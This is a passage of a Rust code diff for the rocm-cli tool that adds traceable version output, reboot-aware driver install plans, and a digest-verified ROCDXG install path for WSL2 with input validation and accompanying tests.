@@ -176,7 +176,8 @@ enum Command {
         #[arg(long)]
         device_index: Option<i64>,
     },
-    /// Print the rocm-cli version.
+    /// Print the rocm-cli version, release tag or branch, and commit hash,
+    /// plus the ROCm SDK and GPU driver this machine would use.
     Version,
     /// Generate a shell completion script for the given shell.
     Completions {
@@ -1343,7 +1344,8 @@ fn run() -> Result<()> {
 }
 
 /// Build the root `rocm` command with its top-level subcommands ordered
-/// alphabetically in `--help` output (EAI-7362).
+/// alphabetically in `--help` output (EAI-7362), and `-V`/`--version` reporting
+/// the same traceable string as `rocm version` (see [`cli_version_string`]).
 ///
 /// clap assigns each subcommand an incrementing display order in declaration
 /// order and renders the command list sorted by `(display_order, name)`.
@@ -1355,14 +1357,23 @@ fn run() -> Result<()> {
 /// subcommand *after* this runs and leaves it at that default, so matching the
 /// default here lets `help` sort into its alphabetical position instead of being
 /// pinned last. The regression test guards this if clap's default ever changes.
+///
+/// `display_name` only changes what `-V`/`--version` prints ahead of the
+/// version string — verified against `--help`'s `Usage:` line and `completions`
+/// output, both of which are generated from `Cli::command()` directly and so
+/// bypass this override.
 fn cli_command() -> clap::Command {
-    Cli::command().mut_subcommands(|sc| sc.display_order(999usize))
+    Cli::command()
+        .mut_subcommands(|sc| sc.display_order(999usize))
+        .version(cli_version_string())
+        .display_name("rocm-cli")
 }
 
 /// Parse process arguments through [`cli_command`] so `rocm --help` and
-/// `rocm help` list subcommands alphabetically. Mirrors the derived
-/// `Cli::parse()`, which builds from `Cli::command()` directly and therefore
-/// cannot pick up the reordering.
+/// `rocm help` list subcommands alphabetically and `rocm -V`/`--version` print
+/// the traceable version string. Mirrors the derived `Cli::parse()`, which
+/// builds from `Cli::command()` directly and therefore cannot pick up either
+/// override.
 ///
 /// Returns a [`ClapExitCode`]-carrying error instead of calling
 /// `clap::Error::exit()` directly, so `run()`'s caller can unwrap the code
@@ -1373,6 +1384,60 @@ fn cli_command() -> clap::Command {
 fn parse_cli() -> Result<Cli> {
     let matches = cli_command().try_get_matches().map_err(clap_exit_code)?;
     Cli::from_arg_matches(&matches).map_err(clap_exit_code)
+}
+
+/// What every version-reporting surface (`-V`/`--version`, `rocm version`, and
+/// the MCP in-process handler) prints: the semantic version Cargo built, plus
+/// the git ref and commit hash [`build.rs`] embedded, additively — never a
+/// replacement, so a build with an "unknown" ref (no tag, no branch, no git)
+/// still reports a real version number rather than none at all.
+fn cli_version_string() -> String {
+    format!(
+        "{} ({}, {})",
+        env!("CARGO_PKG_VERSION"),
+        env!("ROCM_CLI_VERSION_REF"),
+        env!("ROCM_CLI_GIT_HASH")
+    )
+}
+
+/// `rocm version`: the traceable build string, plus the ROCm SDK and GPU
+/// driver this machine would actually use -- unlike `-V`/`--version` and the
+/// MCP fast path, which stay a single terse line for scripts and in-process
+/// callers.
+///
+/// "The ROCm SDK" prefers the active managed TheRock runtime (what `rocm`
+/// itself runs engines against), falling back to a detected but unmanaged
+/// system ROCm install -- the same precedence `rocm`'s freeform "ROCm status"
+/// answer already uses, just without its other, heavier probing.
+fn version() -> Result<()> {
+    println!("rocm-cli {}", cli_version_string());
+
+    let paths = AppPaths::discover()?;
+    let config = RocmCliConfig::load(&paths).unwrap_or_default();
+    let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+    match current_runtime_manifest(&config, &manifests) {
+        Some(manifest) => println!(
+            "ROCm SDK: {} ({})",
+            therock::runtime_version_display(&manifest.version),
+            manifest.install_root.display()
+        ),
+        None => match rocm_core::detect_legacy_rocm_sdk() {
+            Some((version, path)) => {
+                println!(
+                    "ROCm SDK: {version} (unmanaged install at {})",
+                    path.display()
+                );
+            }
+            None => println!("ROCm SDK: not detected"),
+        },
+    }
+
+    match rocm_core::detect_gpu_driver_version() {
+        Some(version) => println!("GPU driver: {version}"),
+        None => println!("GPU driver: not detected"),
+    }
+
+    Ok(())
 }
 
 /// Legacy `uv` cache location, used before the cache was colocated with the managed
@@ -1972,10 +2037,7 @@ fn dispatch(cli: Cli) -> Result<()> {
             dry_run,
             device_index,
         }) => fix(fix_id, yes, dry_run, device_index),
-        Some(Command::Version) => {
-            println!("rocm {}", env!("CARGO_PKG_VERSION"));
-            Ok(())
-        }
+        Some(Command::Version) => version(),
         Some(Command::Setup { command }) => setup(command),
         Some(Command::EngineServeHttp {
             engine,
@@ -2437,6 +2499,9 @@ fn strip_subcommands(cmd: clap::Command) -> clap::Command {
     if let Some(long_version) = cmd.get_long_version() {
         bare = bare.long_version(long_version.to_owned());
     }
+    if let Some(display_name) = cmd.get_display_name() {
+        bare = bare.display_name(display_name.to_owned());
+    }
     for alias in cmd.get_visible_aliases() {
         bare = bare.visible_alias(alias.to_owned());
     }
@@ -2557,6 +2622,11 @@ struct ExamineJsonSummary<'a> {
     active_runtime_id: Option<&'a str>,
     active_runtime_key: Option<&'a str>,
     previous_runtime_key: Option<&'a str>,
+    /// Where the active runtime lives, completing the `id`/`key`/`root` triple.
+    /// Not derivable from the key: `install_root` is its own field on the
+    /// manifest, and `install sdk --prefix`, `runtimes adopt` and `runtimes
+    /// import` all set it freely.
+    active_runtime_root: Option<String>,
 }
 
 fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
@@ -2579,6 +2649,12 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
         // in a loop.
         let host = ExamineSummary::gather()?;
         let configured_default_engine = config.default_engine.as_deref();
+        // Same resolution the human report uses, minus the recovery write above:
+        // an unreadable registry leaves the root `null` rather than failing the
+        // inspection, which is the weaker answer but still an answer.
+        let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+        let active_runtime_root = current_runtime_manifest(&config, &manifests)
+            .map(|manifest| manifest.install_root.display().to_string());
         let document = ExamineJson {
             examination: &examination,
             summary: ExamineJsonSummary {
@@ -2587,6 +2663,7 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
                 active_runtime_id: config.default_runtime_id.as_deref(),
                 active_runtime_key: config.active_runtime_key.as_deref(),
                 previous_runtime_key: config.previous_runtime_key.as_deref(),
+                active_runtime_root,
                 host: &host,
             },
         };
@@ -3011,7 +3088,7 @@ fn install_driver(
         pre_driver: examine.driver,
         post_driver: None,
         boot_id_at_execution: boot_id,
-        reboot_required: false,
+        reboot_required: plan.reboot_required,
         reboot_observed: false,
         commands: plan.execution_commands(),
         reconciled_at_unix_ms: None,
@@ -3020,36 +3097,54 @@ fn install_driver(
     write_driver_install_state(paths, &state)
         .map_err(|source| DriverInstallError::new(source, false))?;
 
-    for command in &plan.commands {
-        if !matches!(
-            command.phase,
-            DriverCommandPhase::Prepare | DriverCommandPhase::Execute
-        ) {
-            continue;
-        }
-        run_driver_shell_command(&command.command)
-            .with_context(|| format!("driver command failed: {}", command.command))
-            .map_err(|source| DriverInstallError::new(source, true))?;
-    }
-
-    let post_driver = ExamineSummary::gather()
-        .map_err(|source| DriverInstallError::new(source, true))?
-        .driver;
-    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
-    state.post_driver = Some(post_driver);
-    state.reboot_required = true;
-    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
-    write_driver_install_state(paths, &state)
-        .map_err(|source| DriverInstallError::new(source, true))?;
+    execute_driver_install_plan(
+        &plan,
+        &mut state,
+        run_driver_shell_command,
+        |state| write_driver_install_state(paths, state),
+        || ExamineSummary::gather().map(|summary| summary.driver),
+    )
+    .map_err(|source| DriverInstallError::new(source, true))?;
 
     let report = cli_report::ActionReport::new("driver install completed")
-        .detail("reboot_required", true)
+        .detail("reboot_required", plan.reboot_required)
         .detail("state", driver_install_state_path(paths).display());
     output.push_str(&report.render());
     Ok(DriverInstallResult {
         output,
         executed: true,
     })
+}
+
+fn execute_driver_install_plan<Run, Persist, Gather>(
+    plan: &DriverInstallPlan,
+    state: &mut DriverInstallState,
+    mut run: Run,
+    mut persist: Persist,
+    gather_post_driver: Gather,
+) -> Result<()>
+where
+    Run: FnMut(&str) -> Result<()>,
+    Persist: FnMut(&DriverInstallState) -> Result<()>,
+    Gather: FnOnce() -> Result<rocm_core::DriverSummary>,
+{
+    for command in &plan.commands {
+        if plan.reboot_required && command.phase == DriverCommandPhase::Verify {
+            continue;
+        }
+        run(&command.command)
+            .with_context(|| format!("driver command failed: {}", command.command))?;
+    }
+
+    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
+    state.reboot_required = plan.reboot_required;
+    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
+    persist(state)?;
+
+    let post_driver = gather_post_driver()?;
+    state.post_driver = Some(post_driver);
+    persist(state)?;
+    Ok(())
 }
 
 fn reconcile_driver_install(paths: &AppPaths) -> Result<String> {
@@ -3088,7 +3183,6 @@ fn reconcile_driver_install_state(
         .zip(current_boot_id.as_deref())
         .is_some_and(|(executed, current)| executed != current);
     state.reboot_observed = reboot_observed;
-    state.reboot_required = state.reboot_required || state.executed_at_unix_ms.is_some();
     state.post_driver = Some(driver.clone());
     let at_unix_ms = rocm_core::unix_time_millis();
     state.reconciled_at_unix_ms = Some(at_unix_ms);
@@ -3271,6 +3365,13 @@ struct DriverInstallPlan {
     preflight_checks: Vec<String>,
     commands: Vec<DriverPlanCommand>,
     checks: Vec<String>,
+    /// Whether the host must reboot before the verification steps mean anything.
+    ///
+    /// True for the kernel-module paths: an amdgpu DKMS build is not live until
+    /// the machine comes back up. False on WSL2, where nothing kernel-side
+    /// changes — ROCDXG is a userspace library and `ldconfig` publishes it
+    /// immediately, so telling the user to reboot would be wrong.
+    reboot_required: bool,
 }
 
 impl DriverInstallPlan {
@@ -3393,6 +3494,343 @@ struct DriverPassiveCheck {
     detail: String,
 }
 
+/// Release of ROCDXG installed on WSL2, overridable for trying another build.
+///
+/// Resolved once at plan-build time via [`resolve_shell_default_template`], the
+/// same way `ROCM_CLI_AMDGPU_VERSION` is handled for the bare-metal repository
+/// pin. The concrete value is baked into the archive name, the release URL and
+/// the `repo_version:` line, so the plan a user reviews names the build the
+/// install will actually fetch rather than an unexpanded `${...}` placeholder.
+///
+/// How the default is chosen: the newest non-prerelease `librocdxg` release
+/// whose `rocdxg-roct` digest is pinned in [`ROCDXG_PINNED_DIGESTS`]. Moving it
+/// is two edits — add the `(version, digest)` row to that table, then change
+/// the literal here — and the two must move together: a default with no row
+/// makes [`resolve_rocdxg_verification`] refuse to build a plan at all unless
+/// the caller supplies a digest, so a bump that forgets the table breaks every
+/// default WSL install rather than falling back to the previous release.
+///
+/// Deliberately out of scope: `rocdxg-amd-smi-lib_<version>_amd64.deb`, which
+/// v1.2.1 and v1.2.2 ship alongside `rocdxg-roct` and the five releases before
+/// them do not, is not installed here. It is a second prefix under
+/// `/opt/rocm-wsl` carrying its own `amd-smi` and `libamd_smi.so`, and it
+/// installs an `/etc/profile.d` entry that sources the package's own
+/// `/opt/rocm-wsl/.env.sh`, which in turn prepends that prefix to `PATH` and
+/// `LD_LIBRARY_PATH` for new login shells. That is a system-wide environment
+/// change in service of a monitoring utility that neither `wsl_rocdxg_ready`
+/// nor `rocm serve` depends on, and it is not available for every version in
+/// the pinned table. Installing it is a separate decision that belongs behind
+/// its own opt-in, not folded into the plan whose job is to supply the runtime
+/// bridge.
+const ROCDXG_VERSION_EXPR: &str = "${ROCM_CLI_ROCDXG_VERSION:-1.2.2}";
+
+/// Supplies a SHA-256 digest for the ROCDXG package, overriding the pinned one.
+/// Required when installing a version this build has no digest for.
+const ROCDXG_SHA256_ENV: &str = "ROCM_CLI_ROCDXG_SHA256";
+
+/// Opts out of digest verification entirely, when set to an affirmative value.
+/// Named explicitly so that shipping an unverified root install is a deliberate
+/// act with an audit trail in the plan, rather than what happens when a variable
+/// is simply unset.
+const ROCDXG_ALLOW_UNVERIFIED_ENV: &str = "ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED";
+
+/// SHA-256 digests of the `rocdxg-roct` package shipped with each published
+/// ROCDXG release, taken from the release host's own asset metadata.
+///
+/// These exist so the default install is authenticated. The package is fetched
+/// over plain HTTPS from a release page and then handed to `apt-get install`,
+/// which runs its maintainer scripts as root — so without a digest, TLS to the
+/// download host is the only thing standing between a compromised or swapped
+/// artifact and root on the user's machine. That is materially weaker than the
+/// bare-metal apt path in this same file, which installs from a repository
+/// pinned with `signed-by=/etc/apt/keyrings/rocm.gpg`.
+///
+/// A version absent from this table is not installed unless the caller supplies
+/// a digest via `ROCM_CLI_ROCDXG_SHA256` or opts out via
+/// `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`; see [`resolve_rocdxg_verification`].
+/// Add the new pair here when pinning a newer release. Nothing in the tree
+/// checks a row against the published artifact, so a mistyped digest surfaces
+/// only as a failed install on a WSL host — fail-closed, but confusing. Take
+/// the value from the release's own asset metadata, or recompute it:
+///
+/// ```text
+/// curl -L --fail \
+///   https://github.com/ROCm/librocdxg/releases/download/v<version>/rocdxg-roct_<version>_amd64.deb \
+///   | sha256sum
+/// ```
+const ROCDXG_PINNED_DIGESTS: &[(&str, &str)] = &[
+    (
+        "1.0.0",
+        "5e78d300dfb8c10dfd57de24b312ff9f9962a3a971f571e5e9383e1c543b607a",
+    ),
+    (
+        "1.1.0",
+        "d1f92415d218ca10df3c39f2ce48872ee968549a97191e987f2c2a79ab709f23",
+    ),
+    (
+        "1.1.1",
+        "cd2ba9dbfd32bf35755a45e7e92410524f32baa2b4dcc31d0106876d04c3abcc",
+    ),
+    (
+        "1.1.2",
+        "e426a5f58f4f177512a354ed5f0dd7b2c0a2b736f009e09bf806edf18ca6cb97",
+    ),
+    (
+        "1.2.0",
+        "3ed9526719290cd8f590150dad8ea0f234fa779bea6a4c9a8449d7ae6b8cfb6e",
+    ),
+    (
+        "1.2.1",
+        "7889eef45a1132ed2dde88d8ea1356bf791ec9c05802a18940bc81b970e850e0",
+    ),
+    (
+        "1.2.2",
+        "28ded1254811192ebace1f76c0227580184af7b27ab2475fb9728295a702d541",
+    ),
+];
+
+/// Whether a resolved ROCDXG version is safe to place in the plan's commands.
+///
+/// The driver plan is a list of shell lines run through `sh -c`, and the
+/// version is interpolated into three of them — the archive name, the release
+/// URL and the local path — each of which is then executed with `sudo` already
+/// primed by an earlier `apt-get update`. `ROCM_CLI_ROCDXG_VERSION` reaches
+/// this unchanged from the environment, so a value containing `;` or a
+/// backtick would otherwise end the intended command and start an attacker's
+/// own. Restricting it to characters that appear in a Debian package version
+/// removes the possibility rather than trying to escape it.
+fn rocdxg_version_is_well_formed(version: &str) -> bool {
+    !version.is_empty()
+        && version.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && version
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-' | '~'))
+}
+
+/// Whether a string is a bare lowercase 64-character hex SHA-256 digest, the
+/// form `sha256sum -c -` expects.
+fn sha256_digest_is_well_formed(digest: &str) -> bool {
+    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+/// How the downloaded ROCDXG package will be authenticated before it is
+/// installed as root.
+#[derive(Debug, Clone, Eq, PartialEq)]
+enum RocdxgVerification {
+    /// Check the download against this digest and abort the install on a
+    /// mismatch.
+    Digest(String),
+    /// Install without checking, because the caller explicitly asked for it.
+    OptedOut,
+}
+
+/// Decide how a ROCDXG download will be authenticated, or `Err` with the reason
+/// no plan can be built.
+///
+/// Resolution order — an explicit digest wins over the pinned one so a user can
+/// install an artifact this build predates without having to disable
+/// verification wholesale:
+///
+/// 1. `ROCM_CLI_ROCDXG_SHA256`, when it is a well-formed digest.
+/// 2. The digest pinned for this version in [`ROCDXG_PINNED_DIGESTS`].
+/// 3. `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`, when set to an affirmative value
+///    — see [`crate::therock::truthy_env`] for the exact allowlist — which opts
+///    out. `0` and `false` do not.
+///
+/// Nothing left means refusal. Verification is therefore opt-*out*: the failure
+/// mode of an unset variable is a plan that will not run, not a root install of
+/// an unauthenticated package.
+fn resolve_rocdxg_verification(version: &str) -> Result<RocdxgVerification, String> {
+    if let Some(supplied) = std::env::var(ROCDXG_SHA256_ENV)
+        .ok()
+        .map(|value| value.trim().to_ascii_lowercase())
+        .filter(|value| !value.is_empty())
+    {
+        if !sha256_digest_is_well_formed(&supplied) {
+            return Err(format!(
+                "{ROCDXG_SHA256_ENV} is not a 64-character hex SHA-256 digest; refusing to install ROCDXG without a usable digest."
+            ));
+        }
+        return Ok(RocdxgVerification::Digest(supplied));
+    }
+
+    if let Some(pinned) = ROCDXG_PINNED_DIGESTS
+        .iter()
+        .find_map(|(pinned_version, digest)| (*pinned_version == version).then_some(*digest))
+    {
+        return Ok(RocdxgVerification::Digest(pinned.to_owned()));
+    }
+
+    // An allowlist of affirmative values, not "set to anything non-empty":
+    // otherwise `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED=0` — which every reader takes
+    // for "off" — would turn digest checking off for a package installed as
+    // root. Anything this does not recognise leaves verification on.
+    if crate::therock::truthy_env(ROCDXG_ALLOW_UNVERIFIED_ENV) {
+        return Ok(RocdxgVerification::OptedOut);
+    }
+
+    Err(format!(
+        "no known SHA-256 digest for ROCDXG {version}, and this package is installed as root. Set {ROCDXG_SHA256_ENV} to the digest published with that release, or set {ROCDXG_ALLOW_UNVERIFIED_ENV}=1 to install without verifying it."
+    ))
+}
+
+/// A WSL plan that cannot be run, carrying the reason in the same shape every
+/// other unsupported plan uses so `--dry-run`, the approval prompt and
+/// `state.json` all report it identically.
+fn wsl_rocdxg_refusal_plan(repo_version: String, reason: String) -> DriverInstallPlan {
+    DriverInstallPlan {
+        supported: false,
+        mutating: false,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version,
+        reason,
+        preflight_checks: Vec::new(),
+        commands: Vec::new(),
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        reboot_required: false,
+    }
+}
+
+/// The `rocm install driver` plan for a WSL2 host.
+///
+/// WSL2 has no in-tree amdgpu driver to install: the GPU comes from the Windows
+/// host driver through `/dev/dxg`, and what ROCm needs on the Linux side is
+/// ROCDXG (`librocdxg`), which bridges the runtime to it. Without that library
+/// `rocm examine` reports `wsl_rocdxg_missing` and `rocm serve` refuses with
+/// "no usable AMD GPU detected", even though a gfx target is detected — the
+/// target is read from the Windows-side driver.
+///
+/// This used to be a refusal pointing at a shell script under `scripts/`, which
+/// ships only in a git checkout — never in the release bundle — so it was a dead
+/// end for anyone who installed the CLI normally. These are that script's steps;
+/// it has been removed rather than left as a second, untested copy of them.
+fn wsl_rocdxg_driver_plan(escalation: PrivilegeEscalation) -> DriverInstallPlan {
+    let version = resolve_shell_default_template(ROCDXG_VERSION_EXPR);
+    if !rocdxg_version_is_well_formed(&version) {
+        return wsl_rocdxg_refusal_plan(
+            // The rejected value is still rendered into the plan's
+            // `repo_version:` line so the user can see what was refused — but
+            // that line is part of a plan a human reads to decide, and a raw
+            // value containing a newline could forge further lines in it. The
+            // debug form escapes newlines and makes trailing space visible,
+            // which is exactly what is wanted for a value being shown as
+            // rejected.
+            format!("{version:?}"),
+            "ROCM_CLI_ROCDXG_VERSION is not a well-formed package version. It is interpolated into privileged shell commands, so only letters, digits, and `. + - ~` are accepted.".to_owned(),
+        );
+    }
+    let verification = match resolve_rocdxg_verification(&version) {
+        Ok(verification) => verification,
+        Err(reason) => return wsl_rocdxg_refusal_plan(version, reason),
+    };
+
+    let sudo = escalation.prefix();
+    let deb = format!("rocdxg-roct_{version}_amd64.deb");
+    let url = format!("https://github.com/ROCm/librocdxg/releases/download/v{version}/{deb}");
+    let deb_path = format!("/tmp/{deb}");
+    // `version` is validated above and the digest is hex, so neither can carry
+    // shell metacharacters; the quotes keep that guarantee local to the command
+    // rather than resting on a check several functions away.
+    let verify_download = match &verification {
+        RocdxgVerification::Digest(digest) => driver_command(
+            DriverCommandPhase::Execute,
+            &format!("printf '%s  %s\\n' '{digest}' '{deb_path}' | sha256sum -c -"),
+        ),
+        RocdxgVerification::OptedOut => driver_command(
+            DriverCommandPhase::Execute,
+            &format!(
+                "echo 'warning: installing ROCDXG {version} without verifying it ({ROCDXG_ALLOW_UNVERIFIED_ENV} is set)' >&2"
+            ),
+        ),
+    };
+    DriverInstallPlan {
+        supported: true,
+        mutating: true,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version: version,
+        reason:
+            "WSL2 uses the Windows host driver plus ROCDXG, not Linux DKMS; this installs ROCDXG."
+                .to_owned(),
+        // Read, not run: the GPU plumbing belongs to the WSL platform, so if it
+        // is absent the fix is on the Windows side and no Linux package helps.
+        // The Execute phase fails on the same two paths rather than installing
+        // a library with nothing to bind to.
+        preflight_checks: {
+            let mut checks = vec![
+                "/dev/dxg (WSL GPU device)".to_owned(),
+                "/usr/lib/wsl/lib/libdxcore.so (WSL dxcore runtime)".to_owned(),
+            ];
+            checks.extend(driver_root_preflight_checks(escalation));
+            checks
+        },
+        commands: vec![
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /dev/dxg || { echo 'error: /dev/dxg is missing; WSL GPU plumbing is not available' >&2; exit 1; }",
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /usr/lib/wsl/lib/libdxcore.so || { echo 'error: /usr/lib/wsl/lib/libdxcore.so is missing' >&2; exit 1; }",
+            ),
+            // Say why up front rather than letting the first privileged step die
+            // with `sudo: command not found`, which reads like a broken plan.
+            // Skipped when already root: the plan emits no `sudo` at all then,
+            // so demanding the binary would state a precondition it is not
+            // relying on.
+            driver_command(
+                DriverCommandPhase::Prepare,
+                if escalation.needs_sudo_binary() {
+                    "command -v sudo >/dev/null 2>&1 || { echo 'error: sudo is required to install ROCDXG under /opt/rocm' >&2; exit 1; }"
+                } else {
+                    "test \"$(id -u)\" -eq 0 || { echo 'error: this plan was built to run as root' >&2; exit 1; }"
+                },
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get update"),
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get install -y ca-certificates curl"),
+            ),
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("curl -L --fail --show-error --output '{deb_path}' '{url}'"),
+            ),
+            // Authenticating the download is the whole trust anchor for this
+            // plan: everything after it runs the package's maintainer scripts
+            // as root. `sha256sum -c -` exits non-zero on a mismatch, which
+            // aborts the plan before the install step.
+            verify_download,
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("{sudo}apt-get install -y '{deb_path}'"),
+            ),
+            driver_command(DriverCommandPhase::Execute, &format!("{sudo}ldconfig")),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "test -e /opt/rocm/lib/librocdxg.so",
+            ),
+            driver_command(
+                DriverCommandPhase::Verify,
+                "ldconfig -p | grep -q 'librocdxg\\.so'",
+            ),
+        ],
+        // `rocm diagnose` carries the WSL catalog, including the host-side
+        // form that inspects a distro over `wsl.exe` without needing anything
+        // installed inside it.
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        // Userspace only: `ldconfig` publishes the library in this boot.
+        reboot_required: false,
+    }
+}
+
 fn build_driver_install_plan(
     examine: &ExamineSummary,
     os_release_text: &str,
@@ -3423,25 +3861,11 @@ fn build_driver_install_plan(
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            reboot_required: true,
         };
     }
     if examine.wsl.as_ref().is_some_and(|wsl| wsl.is_wsl) {
-        return DriverInstallPlan {
-            supported: false,
-            mutating: false,
-            policy: "wsl_rocdxg".to_owned(),
-            os_id: "wsl".to_owned(),
-            version_id: String::new(),
-            codename: String::new(),
-            repo_version,
-            reason: "WSL uses the Windows host driver plus ROCDXG; run `scripts/wsl_setup_rocdxg.sh` inside WSL instead of installing Linux DKMS.".to_owned(),
-            preflight_checks: Vec::new(),
-            commands: Vec::new(),
-            // `rocm diagnose` carries the WSL catalog, including the host-side
-            // form that inspects a distro over `wsl.exe` without needing anything
-            // installed inside it.
-            checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
-        };
+        return wsl_rocdxg_driver_plan(escalation);
     }
 
     let os_id = parse_os_release_field(os_release_text, "ID").unwrap_or_default();
@@ -3547,6 +3971,8 @@ fn build_driver_install_plan(
             preflight_checks: Vec::new(),
             commands: Vec::new(),
             checks: vec!["rocm examine".to_owned()],
+            // Kernel module: not live until the machine comes back up.
+            reboot_required: true,
         }),
     }
 }
@@ -3765,6 +4191,8 @@ fn apt_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -3868,6 +4296,8 @@ fn dnf_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -3965,6 +4395,8 @@ fn sles_driver_plan(
             "amd-smi version if present".to_owned(),
             "rocminfo if present".to_owned(),
         ],
+        // Kernel module: not live until the machine comes back up.
+        reboot_required: true,
     }
 }
 
@@ -4132,14 +4564,23 @@ fn render_driver_install_plan(plan: &DriverInstallPlan, yes: bool, dry_run: bool
         .iter()
         .filter(|command| command.phase == DriverCommandPhase::Verify)
         .collect::<Vec<_>>();
+    // A plan that changes nothing kernel-side is live as soon as it finishes, so
+    // labelling its checks "post_reboot" would tell the user to reboot for
+    // nothing — and would contradict the `reboot_required: false` this same plan
+    // reports after executing.
+    let checks_label = if plan.reboot_required {
+        "post_reboot"
+    } else {
+        "post_install"
+    };
     if !verification_commands.is_empty() {
-        let _ = writeln!(output, "  post_reboot_check_commands:");
+        let _ = writeln!(output, "  {checks_label}_check_commands:");
         for command in verification_commands {
             let _ = writeln!(output, "    {}", command.command);
         }
     }
     if !plan.checks.is_empty() {
-        let _ = writeln!(output, "  post_reboot_checks:");
+        let _ = writeln!(output, "  {checks_label}_checks:");
         for check in &plan.checks {
             let _ = writeln!(output, "    {check}");
         }
@@ -14675,7 +15116,7 @@ fn run_rocm_read_only_in_process(paths: &AppPaths, args: &[String]) -> Result<St
                 || command == "--version"
                 || command == "-V" =>
         {
-            Ok(format!("rocm {}\n", env!("CARGO_PKG_VERSION")))
+            Ok(format!("rocm-cli {}\n", cli_version_string()))
         }
         [command]
             if command.eq_ignore_ascii_case("model") || command.eq_ignore_ascii_case("models") =>
@@ -30020,6 +30461,195 @@ VERSION_CODENAME=noble
     }
 
     #[test]
+    fn driver_plan_executor_runs_verify_after_execute() -> Result<()> {
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", true).driver),
+        )?;
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(state.executed_at_unix_ms.is_some());
+        Ok(())
+    }
+
+    #[test]
+    fn driver_plan_executor_defers_verify_when_reboot_is_required() -> Result<()> {
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(plan.reboot_required);
+        let expected = plan.execution_commands();
+        let verify_commands = plan
+            .commands
+            .iter()
+            .filter(|command| command.phase == DriverCommandPhase::Verify)
+            .map(|command| command.command.clone())
+            .collect::<Vec<_>>();
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", false).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", false).driver),
+        )?;
+
+        assert_eq!(observed, expected);
+        assert!(
+            verify_commands
+                .iter()
+                .all(|command| !observed.contains(command)),
+            "reboot-gated Verify commands must be deferred: {verify_commands:?}"
+        );
+        assert!(state.executed_at_unix_ms.is_some());
+        assert!(state.reboot_required);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_driver_verify_does_not_mark_execution_completed() -> Result<()> {
+        let (root, paths) = test_paths("driver-verify-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
